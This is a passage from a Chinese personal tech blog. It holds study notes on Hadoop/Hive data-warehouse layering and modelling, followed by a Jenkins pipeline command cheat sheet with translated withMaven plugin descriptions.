<p>方案二：或者是关掉虚拟内存检查。我们选这个，修改yarn-site.xml<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;yarn.nodemanager.vmem-check-enabled&lt;/name&gt;</span><br><span class="line">&lt;value&gt;false&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>
<p>5、虚拟机固定ip</p>
<p>拓展虚拟机配置胡总和其他莫名其妙情况，会导致虚拟机ip改变</p>
<p>方案一：<br>1、获取虚拟机ip以及网关<br><code>ip a</code><br>2、修改网络配置</p>
<p><code>vim /etc/sysconfig/network-scripts/ifcfg-en33</code><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201025/9yBXdHJ4j8Ka.png" alt="mark"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">HWADDR=&quot;00:0C:29:F4:7E:C9&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">NM_CONTROLLED=&quot;yes&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">UUID=&quot;2a76c2f8-cd47-44af-936d-11559b3a498d&quot;</span><br><span class="line">IPADDR=&quot;192.168.73.100&quot;</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">GATEWAY=&quot;192.168.73.2&quot;</span><br><span class="line"></span><br><span class="line">DNS1=192.168.123.1</span><br><span class="line">DNS2=114.114.114.114</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：GATEWAY 是 2   不然连不了外网  DNS 也需要配置  可以公共的DNS 也可以是电脑的DNS</span><br></pre></td></tr></table></figure></p>
<p>3、重启网络或者虚拟机生效</p>
<p>5、flume unableto tail files</p>
<p>已解决，问题在于配置的拦截器有问题，导致所有event在拦截器处被拦截，flume在为event分配channel的时候，event为null，故抛出NPE</p>
<h2 id="数据分层"><a href="#数据分层" class="headerlink" title="数据分层"></a>数据分层</h2><h3 id="分层的概念"><a href="#分层的概念" class="headerlink" title="分层的概念"></a>分层的概念</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201026/t9LufQ2eLvuf.png" alt="mark"></p>
<h3 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构"></a>分层结构</h3><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><h3 id="表的分类"><a href="#表的分类" class="headerlink" title="表的分类"></a>表的分类</h3><p>实体表：事实存在的业务对象。用户、商家、商品、销售人员。<br>维度表：就是业务状态，代码的解释表————码表。订单支付状态表、地区表、支付方式、审批状态、商品分类。</p>
<p>事务型事实表：产生的业务数据，特点一旦产生不会改变。交易流水、操作日志、出入库记录等等。<br>交易流水表通常包含哪些字段：编号对外业务编号、订单编号、用户编号、支付宝流水编号、支付金额、交易内容、支付类型、支付时间。<br>周期性事实表：也是业务产生的数据，但是特点是数据是周期性变化的。贷款申请、订单表。<br>订单表包含的字段；订单编号、订单金额、订单状态、用户id、支付方式、支付流水线号、创建时间、操作时间</p>
<p>订单表与订单流水表有什么区别呢？</p>
<h3 id="同步策略"><a href="#同步策略" class="headerlink" title="同步策略"></a>同步策略</h3><p>全量表、增量表、新增及变化表、拉链表。<br>上面四种表是啥意思？</p>
<p>实体表同步策略：<br>每日全量~</p>
<p>维度表同步策略：<br>每日全量~：有变化的做每日全量、无变化的做固定值</p>
<p>事务型事实表同步策略：<br>每日增量~：每日增量表，每日创建一个分区存储。<br>分区存储啥意意思？</p>
<p>周期型事务表同步策略：<br>数据的新增以及修改比较多，利用每日新增和变化表制作一张你拉链表。</p>
<h3 id="范式理论"><a href="#范式理论" class="headerlink" title="范式理论"></a>范式理论</h3><p>范式概念</p>
<p>关系型数据库设计时，遵照一定的规范要求，目的在于降低数据的冗余性，目前业界范式有：第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)、第五范式(5NF)。</p>
<p>范式的标准定义是：符合某一种级别的关系模式的集合，表示一个关系内部各属性之间的联系的合理化程度。通俗地讲，范式可以理解为一张数据表的表结构，所符合的某种设计标准的级别。</p>
<p>使用范式的根本目的是：<br>  1）减少数据冗余，尽量让每个数据只出现一次。<br>  2）保证数据一致性<br> 缺点是获取数据时，需要通过join拼接出最后的数据。</p>
<p>函数依赖：<br>完全函数依赖：AB能推出C，但是不能单独推出C。<br>部分函数依赖：AB能推出C，A和B都能单独推出C。<br>传递函数依赖：A能推B，B能推C，但是反过来推不了。</p>
<p>三范式区分：<br>1、第一范式：属性不可分割<br>2、第二范式：<br>3、第三范式</p>
<h3 id="关系模型与维度模型"><a href="#关系模型与维度模型" class="headerlink" title="关系模型与维度模型"></a>关系模型与维度模型</h3><h3 id="雪花模型、星型模型和星座模型"><a href="#雪花模型、星型模型和星座模型" class="headerlink" title="雪花模型、星型模型和星座模型"></a>雪花模型、星型模型和星座模型</h3><h3 id="DWD-ODS"><a href="#DWD-ODS" class="headerlink" title="DWD ODS"></a>DWD ODS</h3><p>去空 判重  导入数据</p>
<p>甲苯要看</p>
<p>降维是个什么鬼？</p>
<h3 id="DWS"><a href="#DWS" class="headerlink" title="DWS"></a>DWS</h3><p>宽表是个什么鬼；做什么统计呢？</p>
<h3 id="ADS"><a href="#ADS" class="headerlink" title="ADS"></a>ADS</h3><p>交易额  转化率  日活  </p>
<p>漏斗分析</p>
<p>复购率</p>
<h2 id="ODS-amp-DWD"><a href="#ODS-amp-DWD" class="headerlink" title="ODS &amp; DWD"></a>ODS &amp; DWD</h2><h3 id="ODS"><a href="#ODS" class="headerlink" title="ODS"></a>ODS</h3><p>1、内部表与外部表啥意思</p>
<p>外部表：跨部门协作、多人操作同一张表<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">外部表：临时表 自己测试使用的</span><br><span class="line"></span><br><span class="line">表名要见名生意~   ods_</span><br><span class="line"></span><br><span class="line">LZO 压缩处理：  输入格式就是lzo，输出运算结果是text</span><br><span class="line"></span><br><span class="line">设置数据存储位置：</span><br><span class="line">```</span><br><span class="line">hive (gmall)&gt; </span><br><span class="line">drop table if exists ods_start_log;</span><br><span class="line">CREATE EXTERNAL TABLE  `ods_start_log`(`line` string)</span><br><span class="line">PARTITIONED BY (`dt` string)</span><br><span class="line">STORED AS</span><br><span class="line">  INPUTFORMAT &apos;com.hadoop.mapred.DeprecatedLzoTextInputFormat&apos;</span><br><span class="line">  OUTPUTFORMAT &apos;org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat&apos;</span><br><span class="line">LOCATION &apos;/warehouse/gmall/ods/ods_start_log&apos;;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### DWD</span><br><span class="line"></span><br><span class="line">看不明白，啥玩意是一进一出？多进多出？</span><br><span class="line"></span><br><span class="line">``干啥的？ </span><br><span class="line"></span><br><span class="line">除了最后一层不能压缩 中间的都能压缩</span><br><span class="line"></span><br><span class="line">压缩会不会影响性能？</span><br><span class="line"></span><br><span class="line">启动日志基础明细表</span><br><span class="line">时间日志基础明细表    两个啥区别？</span><br><span class="line"></span><br><span class="line">GenericUDTF 什么鬼？</span><br><span class="line"></span><br><span class="line">工厂类？？？长啥样？  Java 设计模式咋玩的？？？？</span><br><span class="line"></span><br><span class="line">hive 的一个优化策略</span><br><span class="line"></span><br><span class="line">导数据有六种</span><br><span class="line"></span><br><span class="line">base_analizer 怎么处理空字符串  怎么防止数组越界</span><br><span class="line"></span><br><span class="line">## 业务术语</span><br><span class="line">新增用户：</span><br><span class="line">日新增  月新增   周新增   拉融资~</span><br></pre></td></tr></table></figure></p>
<p>活跃用户：<br>打开就算~~</p>
<p>周活跃   月活跃</p>
<p>沉默用户仅在当日活跃</p>
<p>版本分布：不同版本的周内新增用户数、活跃用户数、判断版本差异的优劣和用户行为</p>
<p>本周回流：上周未启动 本周启动了</p>
<p>连续n周活跃：<br>连续活跃：<br>近期流失用户：  多少周内没有使用的<br>留存用户：  某段时间新增的   过了多久之后还剩余多少用户<br>用户新鲜率：老用户  与 新用户 活跃占比<br>单次使用时间：<br>日使用时间：<br>启动次数计算标准：</p>
<p> collect_set函数</p>
<p> hive 的其他函数多练练  连熟悉  特别是蚂蚁金服的那玩意  sql 是要每天要练习的   大量练习  练出感觉</p>
<h2 id="需求-用户活跃主题"><a href="#需求-用户活跃主题" class="headerlink" title="需求  用户活跃主题"></a>需求  用户活跃主题</h2><h3 id="DWS层"><a href="#DWS层" class="headerlink" title="DWS层"></a>DWS层</h3><p> 日活  周活  月活  是所有公司必须统计的  </p>
<h3 id="ADS层"><a href="#ADS层" class="headerlink" title="ADS层"></a>ADS层</h3><p>## </p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>数仓</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins进阶笔记</title>
    <url>/jenkins%E8%BF%9B%E9%98%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="catchError：异常处理"><a href="#catchError：异常处理" class="headerlink" title="catchError：异常处理"></a>catchError：异常处理</h3><p>两种写法：<br>最终结果 jenkins 都会判断为成功。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        sh &apos;might fail&apos;</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        echo &quot;Caught: $&#123;err&#125;&quot;</span><br><span class="line">        currentBuild.result = &apos;FAILURE&apos;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        sh &apos;./tear-down.sh&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    step([$class: &apos;Mailer&apos;, recipients: &apos;admin@somewhere&apos;])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        sh label: &apos;&apos;, script: &apos;&apos;&apos;</span><br><span class="line">        curl -u ftpuser:123456 ftp://172.16.9.242/artifacts/60/ -X &quot;MKD $JOB_NAME&quot; </span><br><span class="line">        &apos;&apos;&apos; </span><br><span class="line">    &#125;</span><br><span class="line">    catch (exc) &#123;</span><br><span class="line">        echo &apos;创建ftp文件夹失败，尝试能否上传成功&apos;                      </span><br><span class="line">    &#125; </span><br><span class="line">    finally &#123;</span><br><span class="line">        sh &apos;**********&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="deleteDir：删除文件-文件夹"><a href="#deleteDir：删除文件-文件夹" class="headerlink" title="deleteDir：删除文件/文件夹"></a>deleteDir：删除文件/文件夹</h3><p><code>deleteDir()</code></p>
<h3 id="dir-选择工作区"><a href="#dir-选择工作区" class="headerlink" title="dir:选择工作区"></a>dir:选择工作区</h3><p><code>dir()</code></p>
<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p><code>echo &#39;hello&#39;</code></p>
<h3 id="error-自定义异常抛出"><a href="#error-自定义异常抛出" class="headerlink" title="error:自定义异常抛出"></a>error:自定义异常抛出</h3><p><code>error &#39;an error&#39;</code></p>
<h3 id="fileExists：判断文件-文件夹是否存在"><a href="#fileExists：判断文件-文件夹是否存在" class="headerlink" title="fileExists：判断文件/文件夹是否存在"></a>fileExists：判断文件/文件夹是否存在</h3><p><code>fileExists &#39;./dist&#39;</code></p>
<h3 id="isUnix-判断操作系统"><a href="#isUnix-判断操作系统" class="headerlink" title="isUnix:判断操作系统"></a>isUnix:判断操作系统</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isUnix()</span><br><span class="line"></span><br><span class="line">false if Windows</span><br><span class="line">true if linux</span><br></pre></td></tr></table></figure>
<h3 id="mail-邮件功能"><a href="#mail-邮件功能" class="headerlink" title="mail:邮件功能"></a>mail:邮件功能</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mail bcc: &apos;&apos;, body: &apos;这是一个测试邮件&apos;, cc: &apos;l_hc@winning.com.cn&apos;, from: &apos;l_hc@winning.com.cn&apos;, replyTo: &apos;&apos;, subject: &apos;测试&apos;, to: &apos;l_hc@winning.com.cn&apos;</span><br></pre></td></tr></table></figure>
<h3 id="pwd-返回文件路径"><a href="#pwd-返回文件路径" class="headerlink" title="pwd:返回文件路径"></a>pwd:返回文件路径</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两种 显示当前 显示临时工作目录</span><br><span class="line">pwd tmp: true </span><br><span class="line">pwd()</span><br></pre></td></tr></table></figure>
<h3 id="readFile"><a href="#readFile" class="headerlink" title="readFile:"></a>readFile:</h3><p><code>readFile encoding: &#39;utf-8&#39;, file: &#39;./ex1.txt&#39;</code></p>
<h3 id="retry-出现异常时重试"><a href="#retry-出现异常时重试" class="headerlink" title="retry:出现异常时重试"></a>retry:出现异常时重试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">retry(5) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep:"></a>sleep:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认秒，和省略参数：</span><br><span class="line">sleep 30</span><br><span class="line">非默认值：</span><br><span class="line">sleep time: 30, unit: &apos;NANOSECONDS&apos;</span><br><span class="line">可选择参数：</span><br><span class="line">NANOSECONDS</span><br><span class="line">MICROSECONDS</span><br><span class="line">MILLISECONDS</span><br><span class="line">SECONDS</span><br><span class="line">MINUTES</span><br><span class="line">HOURS</span><br><span class="line">DAYS</span><br></pre></td></tr></table></figure>
<h3 id="timeout-超时停止"><a href="#timeout-超时停止" class="headerlink" title="timeout:超时停止"></a>timeout:超时停止</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数同上：</span><br><span class="line">timeout(activity: true, time: 30, unit: &apos;NANOSECONDS&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def pipeline</span><br><span class="line">    node(&apos;slave&apos;) &#123;</span><br><span class="line">        pipeline = load &apos;pipeline.groovy&apos;</span><br><span class="line">        pipeline.functionA()</span><br><span class="line">    &#125;</span><br><span class="line">    pipeline.functionB()</span><br></pre></td></tr></table></figure>
<h3 id="node-脚本式-pipeline-指明运行的节点"><a href="#node-脚本式-pipeline-指明运行的节点" class="headerlink" title="node:脚本式 pipeline 指明运行的节点"></a>node:脚本式 pipeline 指明运行的节点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node(&apos;master&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="node-可以更换缓存位置"><a href="#node-可以更换缓存位置" class="headerlink" title="node:可以更换缓存位置"></a>node:可以更换缓存位置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nodejs(&apos;node-v10.16.3&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nodejs(cacheLocationStrategy: executor(), nodeJSInstallationName: &apos;node-v10.16.3&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nodejs(cacheLocationStrategy: workspace(), nodeJSInstallationName: &apos;node-v10.16.3&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="properties：job的设置"><a href="#properties：job的设置" class="headerlink" title="properties：job的设置"></a>properties：job的设置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">properties([disableConcurrentBuilds(), buildDiscarder(logRotator(artifactDaysToKeepStr: &apos;&apos;, artifactNumToKeepStr: &apos;&apos;, daysToKeepStr: &apos;3&apos;, numToKeepStr: &apos;&apos;)), pipelineTriggers([cron(&apos;0 5 * * *&apos;)])])</span><br></pre></td></tr></table></figure>
<h3 id="sshpublisher"><a href="#sshpublisher" class="headerlink" title="sshpublisher"></a>sshpublisher</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshPublisher(</span><br><span class="line">    publishers: [</span><br><span class="line">        sshPublisherDesc(</span><br><span class="line">            configName: &apos;212开发服务主线&apos;, </span><br><span class="line">            transfers: [</span><br><span class="line">                sshTransfer(</span><br><span class="line">                    cleanRemote: false, </span><br><span class="line">                    excludes: &apos;&apos;, </span><br><span class="line">                    execCommand: &apos;&apos;&apos;cd /winning/app/html/$app_id \n unzip -o dist.zip \n nginx reload&apos;&apos;&apos;,</span><br><span class="line">                    execTimeout: 120000, </span><br><span class="line">                    flatten: false, </span><br><span class="line">                    makeEmptyDirs: false, </span><br><span class="line">                    noDefaultExcludes: false, </span><br><span class="line">                    patternSeparator: &apos;[, ]+&apos;, </span><br><span class="line">                    remoteDirectory: &quot;/winning/app/html/$app_id&quot;, </span><br><span class="line">                    remoteDirectorySDF: false, </span><br><span class="line">                    removePrefix: &quot;&quot;, </span><br><span class="line">                    sourceFiles: &quot;dist.zip&quot;)], </span><br><span class="line">                    usePromotionTimestamp: false, </span><br><span class="line">                    useWorkspaceInPromotion: false, </span><br><span class="line">                    verbose: false</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            )</span><br></pre></td></tr></table></figure>
<h3 id="stage"><a href="#stage" class="headerlink" title="stage"></a>stage</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stage(&apos;num 1&apos;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="unstable-不稳定构建显示信息"><a href="#unstable-不稳定构建显示信息" class="headerlink" title="unstable:不稳定构建显示信息"></a>unstable:不稳定构建显示信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unstable &apos;Prints a message to the log and sets the overall build result and the stage result to UNSTABLE. The message will also be associated with the stage result and may be shown in visualizations.&apos;</span><br></pre></td></tr></table></figure>
<h3 id="unstash-恢复之前保存的一组文件"><a href="#unstash-恢复之前保存的一组文件" class="headerlink" title="unstash:恢复之前保存的一组文件"></a>unstash:恢复之前保存的一组文件</h3><p><code>unstash &#39;dist.zip&#39;</code></p>
<h3 id="validateDeclarativePipeline-验证包含声明性管道的文件-返回-trun-false"><a href="#validateDeclarativePipeline-验证包含声明性管道的文件-返回-trun-false" class="headerlink" title="validateDeclarativePipeline:验证包含声明性管道的文件,返回 trun | false"></a>validateDeclarativePipeline:验证包含声明性管道的文件,返回 trun | false</h3><p>validateDeclarativePipeline ‘./dist’</p>
<h3 id="waitUntil-重复运行"><a href="#waitUntil-重复运行" class="headerlink" title="waitUntil:重复运行"></a>waitUntil:重复运行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重复运行它的主体，直到它返回 true。 如果返回 false，则等待一段时间并再次尝试。 (接下来的失败会减慢两次尝试之间的延迟。) </span><br><span class="line">重试的次数没有限制，但是如果主体抛出一个立即抛出的错误。</span><br><span class="line">waitUntil &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="withCredentials-使用密匙"><a href="#withCredentials-使用密匙" class="headerlink" title="withCredentials:使用密匙"></a>withCredentials:使用密匙</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node &#123;</span><br><span class="line">  withCredentials([usernameColonPassword(credentialsId: &apos;mylogin&apos;, variable: &apos;USERPASS&apos;)]) &#123;</span><br><span class="line">    sh &apos;&apos;&apos;</span><br><span class="line">      set +x</span><br><span class="line">      curl -u &quot;$USERPASS&quot; https://private.server/ &gt; output</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">node &#123;</span><br><span class="line">  withCredentials([string(credentialsId: &apos;mytoken&apos;, variable: &apos;TOKEN&apos;)]) &#123;</span><br><span class="line">    sh &apos;&apos;&apos;</span><br><span class="line">      set +x</span><br><span class="line">      curl -H &quot;Token: $TOKEN&quot; https://some.api/</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">node &#123;</span><br><span class="line">  ws &#123;</span><br><span class="line">    withCredentials([file(credentialsId: &apos;secret&apos;, variable: &apos;FILE&apos;)]) &#123;</span><br><span class="line">      sh &apos;use $FILE&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="withEnv-设置自定义环境变量"><a href="#withEnv-设置自定义环境变量" class="headerlink" title="withEnv:设置自定义环境变量"></a>withEnv:设置自定义环境变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node &#123;</span><br><span class="line">  withEnv([&apos;MYTOOL_HOME=/usr/local/mytool&apos;]) &#123;</span><br><span class="line">    sh &apos;$MYTOOL_HOME/bin/start&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="withMaven"><a href="#withMaven" class="headerlink" title="withMaven:"></a>withMaven:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">withMaven(</span><br><span class="line">    jdk: &apos;jdk8&apos;, </span><br><span class="line">    maven: &apos;maven-3.6.1&apos;, </span><br><span class="line">    mavenOpts: &apos;-XX:-UseGCOverheadLimit -Xmx512M -Xms512M&apos;, </span><br><span class="line">    options: [</span><br><span class="line">        concordionPublisher(disabled: true), </span><br><span class="line">        findbugsPublisher(disabled: true), </span><br><span class="line">        dependenciesFingerprintPublisher(</span><br><span class="line">            disabled: true, </span><br><span class="line">            includeReleaseVersions: true, </span><br><span class="line">            includeScopeTest: true</span><br><span class="line">            includeScopeRuntime: false, </span><br><span class="line">            includeSnapshotVersions: false), </span><br><span class="line">        artifactsPublisher(disabled: true), </span><br><span class="line">        invokerPublisher(disabled: true), </span><br><span class="line">        jgivenPublisher(disabled: true), </span><br><span class="line">        jacocoPublisher(disabled: true), </span><br><span class="line">        junitPublisher(</span><br><span class="line">            disabled: true, </span><br><span class="line">            healthScaleFactor: 1.0, </span><br><span class="line">            ignoreAttachments: true), </span><br><span class="line">        mavenLinkerPublisher(disabled: true), </span><br><span class="line">        openTasksPublisher(disabled: true), </span><br><span class="line">        pipelineGraphPublisher(</span><br><span class="line">            disabled: true, </span><br><span class="line">            lifecycleThreshold: &apos;package&apos;), </span><br><span class="line">        spotbugsPublisher(disabled: true)</span><br><span class="line">        ]</span><br><span class="line">    ) </span><br><span class="line">    &#123;</span><br><span class="line">        // some block</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">concordionPublisher：</span><br><span class="line">    Publish Concordion reports, if found, regarding the given pattern.</span><br><span class="line">    Test results are by default published if the Jenkins HTMLPublisher Plugin is installed.</span><br><span class="line">    发布关于给定模式的 Concordion 报告(如果找到)。 </span><br><span class="line">    如果安装了 Jenkins HTMLPublisher 插件，测试结果默认情况下是发布的。</span><br><span class="line"></span><br><span class="line">findbugsPublisher：</span><br><span class="line">    Publish FindBugs reports generated by &quot;org.codehaus.mojo:findbugs-maven-plugin:findbugs&quot;.</span><br><span class="line">    FindBugs results are by default published if the Jenkins FindBugs Plugin is installed.</span><br><span class="line">    发布由“ org.codehaus.mojo: FindBugs-maven-plugin: FindBugs”生成的 FindBugs 报告。 </span><br><span class="line">    如果安装了 Jenkins FindBugs 插件，则默认情况下会发布 FindBugs 结果。</span><br><span class="line">    Configure the thresholds for the build health. If left empty then no health report is created. If the actual number of warnings is between the provided thresholds then the build health is interpolated.</span><br><span class="line">    配置构建健康状况的阈值。 如果保持空白，则不会创建健康报告。 如果警告的实际数量介于所提供的阈值之间，那么构建健康状况就会被内插。</span><br><span class="line">    findbugsPublisher(disabled: true, healthy: &apos;60&apos;, unHealthy: &apos;50&apos;), </span><br><span class="line">    Determines which warning priorities should be considered when evaluating the build health.	</span><br><span class="line">    确定在评估构建健康状况时应考虑哪些警告优先级</span><br><span class="line"></span><br><span class="line">dependenciesFingerprintPublisher：</span><br><span class="line">    Fingerprint the Maven dependencies used by the maven project.</span><br><span class="line">    指纹化 Maven 项目使用的 Maven 依赖项。</span><br><span class="line"></span><br><span class="line">artifactsPublisher：</span><br><span class="line">    Archive and fingerprint the artifact and the attached artifacts generated by the maven project.</span><br><span class="line">    将 maven 项目生成的工件和附加工件存档并指纹识别。</span><br><span class="line"></span><br><span class="line">invokerPublisher：</span><br><span class="line">    Publish Invoker reports generated by &quot;org.apache.maven.plugins:maven-invoker-plugin:run&quot;.</span><br><span class="line">    Invoker results are by default published if the Jenkins Maven Invoker Plugin is installed.</span><br><span class="line">    发布由“org.apache.maven.plugins: maven-Invoker-plugin: run”生成的 Invoker 报告。 </span><br><span class="line">    如果安装了 Jenkins Maven Invoker Plugin，则默认情况下会发布 Invoker 结果。</span><br><span class="line"></span><br><span class="line">jgivenPublisher：</span><br><span class="line">    Publish JGiven reports, if found.</span><br><span class="line">    Test results are by default published if the Jenkins JGiven Plugin is installed.</span><br><span class="line">    发布 JGiven 报告，如果找到的话。 如果安装了 Jenkins JGiven 插件，则默认情况下会发布测试结果。</span><br><span class="line"></span><br><span class="line">jacocoPublisher：</span><br><span class="line">    Publish JaCoCo Java Code Coverage Library reports, if found.</span><br><span class="line">    Test results are by default published if the Jenkins JaCoCo Plugin is installed.</span><br><span class="line">    如果找到，则发布 JaCoCo Java 代码覆盖库报告。 </span><br><span class="line">    如果安装了 Jenkins JaCoCo Plugin，则默认情况下会发布测试结果。</span><br><span class="line"></span><br><span class="line">junitPublisher：</span><br><span class="line">    Publish JaCoCo Java Code Coverage Library reports, if found.</span><br><span class="line">    Test results are by default published if the Jenkins JaCoCo Plugin is installed.</span><br><span class="line">    如果找到，则发布 JaCoCo Java 代码覆盖库报告。 </span><br><span class="line">    如果安装了 Jenkins JaCoCo Plugin，则默认情况下会发布测试结果。</span><br><span class="line">        ignoreAttachments：</span><br><span class="line">            Skip the publishing of tests reports attachments.</span><br><span class="line">            Test result attachments are by default published if the Jenkins JUnit Attachments Plugin is installed.</span><br><span class="line">            跳过发布测试报告附件。 </span><br><span class="line">            如果安装了 Jenkins JUnit 附件插件，则默认情况下会发布测试结果附件。</span><br><span class="line">        Health report amplification factor：</span><br><span class="line">            The amplification factor to apply to test failures when computing the test result contribution to the build health score.</span><br><span class="line">            当计算测试结果对构建健康评分的贡献时，增益应用于测试失败。</span><br><span class="line">            The factor is persisted with the build results, so changes will only be reflected in new builds.</span><br><span class="line">            该因素将与构建结果保持一致，因此更改将只反映在新的构建中。</span><br><span class="line">        Retain long standard output/error：</span><br><span class="line">            If checked, any standard output or error from a test suite will be retained in the test results after the build completes. (This refers only to additional messages printed to console, not to a failure stack trace.) Such output is always kept if the test failed, but by default lengthy output from passing tests is truncated to save space. Check this option if you need to see every log message from even passing tests, but beware that Jenkins&apos;s memory consumption can substantially increase as a result, even if you never look at the test results!</span><br><span class="line">            如果勾选此选项，则在构建完成后，测试套件中的任何标准输出或错误都将保留在测试结果中。 (这只引用打印到控制台的附加消息，而不引用失败堆栈跟踪。) 如果测试失败，则始终保留这样的输出，但默认情况下，通过测试的冗长输出会被截断以节省空间。 如果您需要查看来自甚至通过测试的所有日志消息，请选中此选项，但要注意，即使您从未查看测试结果，Jenkins 的内存消耗也会因此大幅增加！</span><br><span class="line"></span><br><span class="line">mavenLinkerPublisher：</span><br><span class="line">    This publisher generates and publishes the links (url) of deployed Maven artifacts.</span><br><span class="line">    该发布者生成并发布已部署的 Maven 构件的链接(url)。</span><br><span class="line"></span><br><span class="line">openTasksPublisher：</span><br><span class="line">    Publish Open Task Scanner reports.</span><br><span class="line">    Open Task Scanner reports are by default published if the Jenkins Task Scanner Plugin is installed.</span><br><span class="line">    The default setup is to look in Java source code for &quot;FIXME&quot; comments as high priority tasks and for &quot;TODO&quot; comments as normal priority tasks.</span><br><span class="line">    发布打开的任务扫描器报告。 </span><br><span class="line">    如果安装了 Jenkins 任务扫描器插件，则默认情况下会发布打开任务扫描器报告。 </span><br><span class="line">    默认设置是在 Java 源代码中查找“ FIXME”注释作为高优先级任务，“ TODO”注释作为普通优先级任务。</span><br><span class="line"></span><br><span class="line">pipelineGraphPublisher：</span><br><span class="line">    Build a graph of pipelines based on their Maven dependencies and on the Maven artifacts they generate.</span><br><span class="line">    根据它们的 Maven 依赖项和它们生成的 Maven 构件构建一个管道图。</span><br><span class="line"></span><br><span class="line">spotbugsPublisher：</span><br><span class="line">    Publish SpotBugs reports generated by &quot;com.github.spotbugs:spotbugs-maven-plugin:spotbugs&quot;.</span><br><span class="line">    SpotBugs results are by default published if the Jenkins FindBugs Plugin is installed.</span><br><span class="line">    发布“ com.github. SpotBugs: SpotBugs-maven-plugin: SpotBugs”生成的 SpotBugs 报告。 </span><br><span class="line">    如果安装了 Jenkins FindBugs 插件，SpotBugs 的结果将默认发布。</span><br><span class="line">        Health thresholds：</span><br><span class="line">            Configure the thresholds for the build health. If left empty then no health report is created. If the actual number of warnings is between the provided thresholds then the build health is interpolated.	</span><br><span class="line">            配置构建健康状况的阈值。 如果保持空白，则不会创建健康报告。 如果警告的实际数量介于所提供的阈值之间，那么构建健康状况就会被内插。</span><br><span class="line">        Health 